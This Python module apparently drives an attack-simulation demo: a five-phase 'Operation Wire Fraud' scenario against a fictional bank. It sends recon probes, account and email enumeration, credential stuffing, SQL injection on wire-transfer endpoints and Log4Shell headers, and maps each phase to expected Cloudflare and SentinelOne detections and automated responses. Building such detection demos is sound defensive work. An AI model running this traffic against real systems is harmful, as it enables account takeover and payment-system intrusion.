"""
Financial Services scenario — Operation Wire Fraud
5-phase attack chain targeting Meridian Bank.
"""

import random

from attacks.engine import send_request, log_phase_event, sleep_between_requests
from attacks.payloads.financial import (
    RECON_PATHS, SCANNER_AGENTS, ACCOUNT_IDS, CUSTOMER_EMAILS,
    CRED_USERNAMES, CRED_PASSWORDS, SQLI_FINANCIAL, LOG4SHELL_PAYLOADS,
)

INDUSTRY_NAME = "Financial Services"
CAMPAIGN_NAME = "Operation Wire Fraud"
INDUSTRY_COLOR = "#1a5276"
INDUSTRY_ICON = "🏦"


def fire_phase_1_one(target, log_buffer, log_counter, stop_flag):
    path = random.choice(RECON_PATHS)
    agent = random.choice(SCANNER_AGENTS)
    send_request(
        url=f"{target}{path}",
        headers={"User-Agent": agent},
        label=f"Recon → {path}",
        log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
        phase=1, industry="financial",
    )


def fire_phase_1_many(count, delay_range, target, log_buffer, log_counter, stop_flag):
    log_phase_event("Phase 1: Initial Reconnaissance — mapping banking infrastructure", 1, "financial", log_buffer, log_counter)
    for _ in range(count):
        if stop_flag and stop_flag.is_set():
            break
        fire_phase_1_one(target, log_buffer, log_counter, stop_flag)
        sleep_between_requests(custom_range=delay_range)


def fire_phase_2_one(target, log_buffer, log_counter, stop_flag):
    # Sequential account probing
    acct_id = random.choice(ACCOUNT_IDS)
    if random.random() < 0.3:
        email = random.choice(CUSTOMER_EMAILS)
        send_request(
            url=f"{target}/api/v1/customers",
            params={"email": email},
            label=f"Enumeration → customer email probe: {email}",
            log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
            phase=2, industry="financial",
        )
    else:
        send_request(
            url=f"{target}/api/account",
            params={"id": acct_id},
            label=f"Enumeration → account id={acct_id}",
            log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
            phase=2, industry="financial",
        )


def fire_phase_2_many(count, delay_range, target, log_buffer, log_counter, stop_flag):
    log_phase_event("Phase 2: Account Enumeration — sequential account number probing", 2, "financial", log_buffer, log_counter)
    for i in range(count):
        if stop_flag and stop_flag.is_set():
            break
        acct_id = 10001 + (i % 50)
        send_request(
            url=f"{target}/api/account",
            params={"id": acct_id},
            label=f"Enumeration → account id={acct_id}",
            log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
            phase=2, industry="financial",
        )
        sleep_between_requests(custom_range=delay_range)


def fire_phase_3_one(target, log_buffer, log_counter, stop_flag):
    send_request(
        url=f"{target}/online-banking/login",
        method="POST",
        data={
            "username": random.choice(CRED_USERNAMES),
            "password": random.choice(CRED_PASSWORDS),
            "action": "login",
        },
        label="Credential Stuffing → /online-banking/login",
        log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
        phase=3, industry="financial",
    )


def fire_phase_3_many(count, delay_range, target, log_buffer, log_counter, stop_flag):
    log_phase_event("Phase 3: Credential Stuffing — botnet targeting online banking login", 3, "financial", log_buffer, log_counter)
    endpoints = ["/online-banking/login", "/api/auth", "/login"]
    for _ in range(count):
        if stop_flag and stop_flag.is_set():
            break
        endpoint = random.choice(endpoints)
        send_request(
            url=f"{target}{endpoint}",
            method="POST",
            data={
                "username": random.choice(CRED_USERNAMES),
                "password": random.choice(CRED_PASSWORDS),
                "action": "login",
            },
            label=f"Credential Stuffing → {endpoint}",
            log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
            phase=3, industry="financial",
        )
        sleep_between_requests(custom_range=delay_range)


def fire_phase_4_one(target, log_buffer, log_counter, stop_flag):
    payload = random.choice(SQLI_FINANCIAL)
    endpoint = random.choice(["/api/wire-transfer", "/api/v1/transactions"])
    if endpoint == "/api/wire-transfer":
        send_request(
            url=f"{target}{endpoint}",
            method="POST",
            data={"amount": payload, "to_account": "9999", "memo": "transfer"},
            label=f"SQLi Wire Transfer → {payload[:60]}",
            log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
            phase=4, industry="financial",
        )
    else:
        send_request(
            url=f"{target}{endpoint}",
            params={"account_id": payload},
            label=f"SQLi Transactions → {payload[:60]}",
            log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
            phase=4, industry="financial",
        )


def fire_phase_4_many(count, delay_range, target, log_buffer, log_counter, stop_flag):
    log_phase_event("Phase 4: Wire Transfer Exploitation — SQL injection on financial API endpoints", 4, "financial", log_buffer, log_counter)
    for _ in range(count):
        if stop_flag and stop_flag.is_set():
            break
        fire_phase_4_one(target, log_buffer, log_counter, stop_flag)
        sleep_between_requests(custom_range=delay_range)


def fire_phase_5_one(target, log_buffer, log_counter, stop_flag):
    cve = random.choice(LOG4SHELL_PAYLOADS)
    send_request(
        url=f"{target}/swift/payment",
        headers={
            "User-Agent": cve["ua"],
            "X-Api-Version": cve["header_value"],
            "X-Request-ID": cve["x_request_id"],
        },
        label=f"Log4Shell CVE-2021-44228 → /swift/payment",
        log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
        phase=5, industry="financial",
    )


def fire_phase_5_many(count, delay_range, target, log_buffer, log_counter, stop_flag):
    log_phase_event("Phase 5: Payment Middleware Exploitation — Log4Shell CVE-2021-44228 on SWIFT payment endpoint", 5, "financial", log_buffer, log_counter)
    for _ in range(count):
        if stop_flag and stop_flag.is_set():
            break
        fire_phase_5_one(target, log_buffer, log_counter, stop_flag)
        sleep_between_requests(custom_range=delay_range)


PHASES = [
    {
        "number": 1,
        "name": "Initial Reconnaissance",
        "description": "Attacker mapping banking infrastructure and identifying exposed endpoints",
        "what_fires": "Path traversal to financial endpoints, scanner User-Agents (sqlmap, Nmap), admin panel probing",
        "cloudflare_story": "Bot score 2/100 — automated scanner identified. 47 banking endpoint probes detected.",
        "sentinelone_story": "Same IP probing 47 banking endpoints in 3 minutes. Recon pattern detected by AI.",
        "hyperautomation": "Bot score < 10 AND requests > 20 in 5 min → Auto-challenge IP at Cloudflare edge",
        "fire_one": fire_phase_1_one,
        "fire_many": fire_phase_1_many,
    },
    {
        "number": 2,
        "name": "Account Enumeration",
        "description": "Attacker probing account numbers and customer IDs to build target list",
        "what_fires": "Sequential GET /api/account?id=10001→10050, customer email probing via /api/v1/customers",
        "cloudflare_story": "Unusual sequential API access pattern — 50 requests to /api/account in 30 seconds.",
        "sentinelone_story": "AI correlated Phase 1 recon + Phase 2 enumeration as same threat actor. Timeline: 8 minutes apart.",
        "hyperautomation": "Sequential API probing detected → Create medium severity incident, rate limit source IP",
        "fire_one": fire_phase_2_one,
        "fire_many": fire_phase_2_many,
    },
    {
        "number": 3,
        "name": "Credential Stuffing",
        "description": "Botnet of 50 IPs simultaneously attacking login with leaked banking credentials",
        "what_fires": "POST /online-banking/login with banking-specific credential pairs, rotating FAKE_IPS per request",
        "cloudflare_story": "Rate limiting fired — 200 POST requests in 60 seconds across 8 IPs. Distributed botnet pattern.",
        "sentinelone_story": "Distributed credential attack — 8 source IPs, coordinated timing, same User-Agent fingerprint. JA4 hash matches known banking trojan.",
        "hyperautomation": "Rate limit fires AND POST to /login → Block ASN, force MFA on all accounts, page SOC",
        "fire_one": fire_phase_3_one,
        "fire_many": fire_phase_3_many,
    },
    {
        "number": 4,
        "name": "Wire Transfer Exploitation",
        "description": "Attacker attempting to manipulate wire transfer API endpoints with SQL injection",
        "what_fires": "POST /api/wire-transfer with SQLi in amount field, GET /api/v1/transactions with injection",
        "cloudflare_story": "OWASP SQLi rule fired on /api/wire-transfer. WAFSQLiAttackScore: 99/100.",
        "sentinelone_story": "Attacker pivoted from enumeration to active exploitation. Same campaign — 4th phase detected by AI correlation.",
        "hyperautomation": "SQLi on financial endpoint → Critical incident, freeze affected accounts API, notify compliance team",
        "fire_one": fire_phase_4_one,
        "fire_many": fire_phase_4_many,
    },
    {
        "number": 5,
        "name": "Payment Middleware Exploitation",
        "description": "Log4Shell exploit targeting Java-based payment processing middleware (SWIFT endpoint)",
        "what_fires": "CVE-2021-44228 Log4Shell strings in User-Agent + X-Api-Version headers targeting /swift/payment",
        "cloudflare_story": "CVE-2021-44228 signature rule block. FirewallForAIInjectionScore: 100. WAFRCEAttackScore: 99.",
        "sentinelone_story": "Nation-state level tooling. Log4Shell on payment infrastructure. Full kill chain Phase 1–5 correlated into single Critical incident.",
        "hyperautomation": "CVE signature + Critical score → Isolate payment API, page CISO, open P1 Jira ticket, push emergency block rule to Cloudflare edge",
        "fire_one": fire_phase_5_one,
        "fire_many": fire_phase_5_many,
    },
]
